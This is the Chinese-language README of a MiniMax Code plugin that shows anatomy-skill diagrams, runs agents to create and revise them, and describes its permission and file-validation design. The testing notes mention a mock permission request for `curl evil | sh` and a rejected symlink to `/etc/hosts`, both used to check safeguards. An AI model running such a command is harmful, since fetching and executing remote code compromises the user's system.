# Anatomy 画廊（`anatomy-gallery`）

[English](README.md) | 简体中文

集中展示 [anatomy](https://github.com/wheresryan22/anatomy) 技能做出的交互式等距图解。每件作品挂在所属展区的墙上，可以进入展厅全屏查看，切换明暗两版，保留全部历史版本。新建和修改由画廊替你发起的 Agent 完成，做完后 Agent 通过画廊自带的 MCP 工具把结果登记回画廊。

画廊自带 anatomy 技能，不用另外安装。本机已经装了独立的 anatomy 技能时，画廊继续用你装的那份。界面是中文。

![Anatomy 画廊墙面](docs/preview.jpg)

## 能做什么

- **逛墙面**：顶部是一件大图，其余作品带画框挂在下方，缩略图是真实页面的实时缩影。技能自带的示例单独列出，可以照着新建。
- **展区**：自己新建、改名、排序展区。“默认”是内置展区，不能移除；移除其他展区时，里面的作品回到“默认”。在作品的“信息”页可以移动作品。
- **展厅**：全屏展示可交互的页面，可切换明暗版本、选择版本，用胶片条或左右方向键在当前展区里切换作品。
- **新建**：写下想讲清楚的内容，选规模、模型和思考强度，可选参考示例和展区。画廊发起一次 Agent 运行，用 anatomy 做图并登记。
- **修改**：在抽屉的“修改”标签里写要怎么改，Agent 改源文件后登记新版本。导入的作品第一次修改前会先复制，不改原文件。
- **过程**：每次由画廊发起的运行都有时间线：需求和完整指令、模型、每条 Agent 发言、合并后的工具步骤、权限请求和你的决定、结束状态。模型名称和模型下拉框里一致。
- **导入**：填写已有 anatomy 页面的绝对路径，同目录的 `-light.html` 会一起导入。
- 主题菜单：跟随系统、浅色、深色。

## 安装

需要 MiniMax Code 3.1.2 或更高版本，因为包里声明了 `agentAccess`、`agentConcurrency` 和 `surface.window`（弹出窗口的尺寸），更早的版本无法安装。

把整个目录（包括隐藏的 `.minimax-plugin/`）复制到 MiniMax Code 的插件目录，命名为 `anatomy-gallery/`（默认是 `~/.minimax/plugins/anatomy-gallery/`，见根目录 README 的安装说明）。重启 MiniMax Code，在右侧面板的 Mini App 入口打开“Anatomy 画廊”，或者让 Agent“打开 Anatomy 画廊”。

做图的环境要求和 anatomy 技能一样：Node.js 20.10 或更高版本；截图校验需要 Chrome 或 Chromium。

## 测试环境

- macOS 27.0 上的 MiniMax Code 3.1.1-preview.4625。这是内部预览版，已经带有 3.1.2 的 Mini App Agent API（`context.agent`、`window.mcode.miniapp.agent`）。通过宿主的发布流程安装，在右侧面板打开。
- 用真实 Agent 运行验证过：从画廊新建作品的完整流程（两件作品，其中一件的运行记录和会话都确认实际使用了所选的 MiniMax-M3.1-Flash-Preview）、一次登记出第二版的修改运行、通过 `register_figure_version` 登记、“过程”标签、模型显示名。
- 在真实运行时验证过（不涉及 Agent 运行）：展区（新建、改名、排序、移动作品、移除展区、内置展区不能移除）、导入、切换版本、明暗版本、浅色和深色主题、侧栏窄宽度布局。控制台和网络请求没有报错。
- 自带技能：把 `HOME` 指向空目录后解析技能，画廊在指令和示例里都选用了自带副本；把自带副本复制出来能构建 `examples/dial-indicator`。
- 权限卡片和取消运行（1.1.0）：在页面上用一个模拟 Agent（`run` / `reply` 契约与宿主相同）验证。同一次运行里的两个请求（第二个是 `curl evil | sh`）都等到点击才回复，之前没有发出任何回复，第二个等了五分钟；点“允许”发出 `allowOnce`，点“拒绝”发出 `deny`；已在侧栏 MCode 卡片上处理过的请求，点画廊卡片时会提示并移除，过程记录里记为“已在对话里处理”；旧的 `/auto-allow` 接口返回 404，请求体里带 `autoAllow` 不起作用；Agent 停在权限请求上时取消运行，运行会终止，卡片随之清除。
- 登记文件校验（1.1.0）：直接调用 `addVersion` 验证。真实的 PNG、JPEG、WebP 截图，以及指向 anatomy 页面的符号链接都被接受；链接到文本文件的 `.png`、内容是文本的 `.png`、链接到 `/etc/hosts` 的 `.html`、目录、不存在的文件和相对路径都被拒绝，被拒文件的内容不会进入 `dataDir`。
- 尚未验证：真实 Agent 运行中的权限卡片、在侧栏回答 Agent 的提问、弹出窗口、在没装 anatomy 的机器上首次新建作品。

## 数据与访问

- **状态**：画廊存的所有数据都在宿主提供的 `context.dataDir` 下：`gallery.json`（作品、版本、展区、运行记录）、`figures/<id>/v<n>/`（每个版本深浅两版页面和截图的副本）、`runs/<runId>.jsonl`（过程记录，每次运行最多 3000 条）。在画廊里撤下作品会删除这些副本和记录，不动 Agent 的源文件夹和关联对话。页面的 `localStorage` 只存主题选择。
- **读取 `dataDir` 以外的文件**：
  - anatomy 技能。画廊按顺序在用户主目录下的固定位置查找独立安装的技能：`.minimax/skills/anatomy`、`.agents/skills/anatomy`、`.claude/skills/anatomy`、`.codex/skills/anatomy`、`.config/opencode/skills/anatomy`。这依赖未公开约定的目录布局。都没有 `SKILL.md` 时，用包里自带的副本。画廊会读取技能的示例和预览图用于展示，并把技能目录告诉 Agent。
  - Agent 登记或你导入的页面：传给 `register_figure_version` 或填进“导入”的 HTML 绝对路径（以及截图），外加同目录的 `-light.html`。不限制所在文件夹，因为截图存在哪由 Agent 决定，技能自带示例的截图也在另一个文件夹。每个路径先用 `realpath` 解析，所有检查都针对真实文件：必须是普通文件；页面必须是 `.html`/`.htm`、不超过 30 MB、带有 anatomy 的 `class="iso"` 标记；截图必须是 PNG、JPEG 或 WebP 文件名、不超过 15 MB，并且文件头确实是 PNG、JPEG 或 WebP（存储格式按文件头确定）。通过检查的文件复制进 `dataDir`，不写原文件。
- **写入 `dataDir` 以外的文件**：画廊本身不写。作品源文件由 Agent 写在宿主分配给画廊会话的工作目录里（见下条）。
- **Agent 运行**（`agentAccess: ["session.run"]`）：每件作品用 `context.agent.create()` 创建一个隐藏会话。新建时，要求 Agent 在该工作目录的 `figures/<figureId>/` 下用 anatomy 做图，生成深浅两版页面和截图、完成校验，然后调用 `register_figure_version`。修改时，要求它只改这件作品的源文件夹（导入的作品改副本），再登记新版本。Agent 拥有正常的能力（文件、Shell、MCP）。Agent 的文字和日志只作为数据展示；画廊只根据 `register_figure_version` 收到并校验过的内容行事。Agent 的输出语言跟随你需求所用的语言。
- **权限**：画廊发起的运行中，每个权限请求都以卡片展示，有“允许”“拒绝”“去对话里批准”三个选项。画廊从不自己回复请求：“允许”“拒绝”只把你对这一个请求的点击转给宿主，你不点就一直等着。“去对话里批准”会把这件作品的对话打开到聊天侧栏，由 MCode 自己的权限卡片和权限模式开关来决定；“本对话全部允许”这类选项属于 MCode，不是画廊的功能。Agent 的提问在聊天侧栏里回答。
- **MCP**：包里声明了一个由 Mini App 自己提供的 MCP 服务（`/mcp/anatomy-gallery`），有 `register_figure_version` 和 `list_figures` 两个工具。画廊运行期间，Agent 可以调用它们，普通对话里也可以。
- **网络**：画廊的 Node 进程不发起任何外部请求。Agent 自己用工具时访问什么由 Agent 决定。
- **进程**：画廊不启动任何进程。构建和截图校验在 Agent 的运行里进行。
- 作品页面在沙箱 iframe 里渲染（`allow-scripts`，不透明来源）。

## 第三方代码

`skills/anatomy/` 是 [anatomy](https://github.com/wheresryan22/anatomy) 的提交 `bc943e4`，MIT 许可，Copyright (c) 2026 Ryan，见 `skills/anatomy/LICENSE`。唯一的改动是在 `skills/anatomy/SKILL.md` 的 `description` 开头加了一句，提示 Agent 本机另装了 anatomy 时优先用那份。

## 许可

[MIT](./LICENSE)。自带的 anatomy 技能保留它自己的 MIT 许可。
